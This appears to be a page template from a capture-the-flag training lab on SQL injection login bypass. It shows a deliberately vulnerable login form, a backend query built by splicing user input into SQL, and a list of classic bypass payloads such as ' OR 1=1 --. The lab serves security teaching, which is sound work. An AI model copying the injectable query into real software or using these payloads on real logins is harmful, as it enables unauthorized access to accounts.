<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Login Bypass - EliteHackLab</title>
  <link rel="stylesheet" href="/css/style.css">
  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.1/css/all.min.css">
</head>
<body>
  <div class="matrix-bg"></div>
  <nav class="main-nav">
    <div class="nav-brand"><span class="brand-icon">💀</span><span class="brand-text">Elite<span class="highlight">Hack</span>Lab</span></div>
    <div class="nav-links"><a href="/"><i class="fas fa-home"></i> Dashboard</a><a href="/labs/sqli"><i class="fas fa-flask"></i> SQLi Labs</a></div>
  </nav>
  <div class="lab-container">
    <div class="lab-header">
      <div class="breadcrumb"><a href="/">Home</a> / <a href="/labs/sqli">SQL Injection</a> / Login Bypass</div>
      <h1>💉 SQL Injection - Login Bypass</h1>
      <div class="lab-info">
        <span class="lab-tag difficulty-easy">Easy</span>
        <span class="lab-tag points"><i class="fas fa-star"></i> 10 pts</span>
      </div>
    </div>

    <div class="lab-section">
      <h2><i class="fas fa-crosshairs"></i> Objective</h2>
      <p>Bypass the login form using SQL injection to authenticate as the admin user without knowing the password.</p>
    </div>

    <div class="lab-section">
      <h2><i class="fas fa-sign-in-alt"></i> Login Form</h2>
      <form method="POST" action="/labs/sqli/login-bypass" class="vulnerable-form">
        <label>Username:</label>
        <input type="text" name="username" placeholder="Enter username" autocomplete="off">
        <label>Password:</label>
        <input type="text" name="password" placeholder="Enter password" autocomplete="off">
        <button type="submit"><i class="fas fa-sign-in-alt"></i> Login</button>
      </form>

      <% if (message) { %>
        <div class="<%= success ? 'success-box' : 'warning-box' %>">
          <%= message %>
        </div>
      <% } %>

      <div class="code-block">
-- Backend Query:
SELECT * FROM users WHERE username = '$username' AND password = '$password'

-- Classic Bypass Payloads:
admin' --
admin' OR '1'='1' --
' OR 1=1 --
' OR '1'='1
      </div>
    </div>

    <div class="flag-submit">
      <h3><i class="fas fa-flag"></i> Capture The Flag</h3>
      <p style="color:var(--text-secondary); font-size:0.85rem; margin-bottom:1rem;">Login as admin to get the flag!</p>
      <form onsubmit="submitFlagInline('sqli-basic', 'flagInput_login', 'flagResult_login'); return false;" style="display:flex; gap:0.5rem; max-width:500px; margin:0 auto;">
        <input type="text" id="flagInput_login" placeholder="FLAG{...}" autocomplete="off">
        <button type="submit" class="btn">Submit</button>
      </form>
      <div id="flagResult_login" style="display:none; margin-top:1rem;"></div>
    </div>
  </div>
  <script src="/js/main.js"></script>
</body>
</html>
